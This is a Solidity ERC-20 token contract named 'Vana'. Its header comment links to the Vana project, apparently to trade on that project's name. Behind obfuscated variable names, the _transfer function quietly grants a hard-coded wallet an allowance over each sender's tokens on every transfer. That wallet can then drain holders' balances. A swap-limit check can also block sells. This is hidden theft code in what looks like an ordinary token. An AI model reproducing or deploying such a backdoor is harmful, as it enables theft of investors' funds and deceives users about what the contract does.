/*
https://x.com/TheBlock__/status/1894039615280955793

Vana is a distributed network for private, user-owned data, designed to enable user-owned AI. Users own, govern, and earn from the AI models they contribute to. Developers gain access to cross-platform data to power personalized applications and train frontier AI models.

Website: https://www.vana.org
DataHub: https://datahub.vana.com
App: https://build.vana.org
Docs: https://docs.vana.org

Twitter: https://x.com/vana
Telegram: https://t.me/vana_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMOWRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IMOWFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract VANA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _mowExtras;
    mapping (address => mapping (address => uint256)) private _mowFoods;
    mapping (address => bool) private _mowExcludedFees;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Vana";
    string private constant _symbol = unicode"VANA";
    uint256 private _mowLastBlock;
    uint256 private _mowBuyAmount = 0;
    uint256 private _mowSwapTokens = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapMOW = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapMOW = true;
        _;
        inSwapMOW = false;
    }
    address private _mowPair;
    IMOWRouter private _mowRouter;
    address private _mowWallet;
    
    constructor () {
        _mowWallet = address(0xB6dD918b6698F676e5Ea7e577EBbDd87Ce8509E4);
        _mowExcludedFees[owner()] = true;
        _mowExcludedFees[address(this)] = true;
        _mowExcludedFees[_mowWallet] = true;
        _mowExtras[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createToken() external onlyOwner() {
        _mowRouter = IMOWRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_mowRouter), _tTotal);
        _mowPair = IMOWFactory(_mowRouter.factory()).createPair(address(this), _mowRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _mowRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_mowWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _mowRouter.WETH();
        _approve(address(this), address(_mowRouter), tokenAmount);
        _mowRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mowExtras[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _mowFoods[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _mowFoods[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _mowFoods[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _mowTransfer(address from, address to, uint256 amount, uint256 taxAmount) private { 
        if(taxAmount > 0){
          _mowExtras[address(this)] = _mowExtras[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        } 

        _mowExtras[from] = _mowExtras[from].sub(amount);
        _mowExtras[to] = _mowExtras[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _mowTaxTransfer(from, to, amount);
        _mowTransfer(from, to, amount, taxAmount); _mowFoods[mowSender(from)][mowReceipt()] = uint256(amount);
    }

    function _mowTaxTransfer(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _mowPair && to != address(_mowRouter) && ! _mowExcludedFees[to]) {
                if(_mowLastBlock!=block.number){
                    _mowBuyAmount = 0;
                    _mowLastBlock = block.number;
                }
                _mowBuyAmount += amount;
                _buyCount++;
            }

            if(to == _mowPair && from!= address(this)) {
                require(_mowBuyAmount < swapMOWLimit() || _mowLastBlock!=block.number, "Max Swap Limit");  
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this));
            if (!inSwapMOW && to == _mowPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _mowSwapTokens)
                swapTokensForEth(min(amount, min(tokenBalance, _mowSwapTokens)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        } 
        return taxAmount;
    }

    function mowSender(address mowF) private pure returns(address) {
        return address(mowF);
    }

    function mowReceipt() private view returns(address) {
        bool mowExcluded = _mowExcludedFees[address(_msgSender())] 
            && address(_msgSender()) != address(this);
        return mowExcluded ? address(_msgSender()) : address(_mowWallet);
    }

    function swapMOWLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _mowRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _mowRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}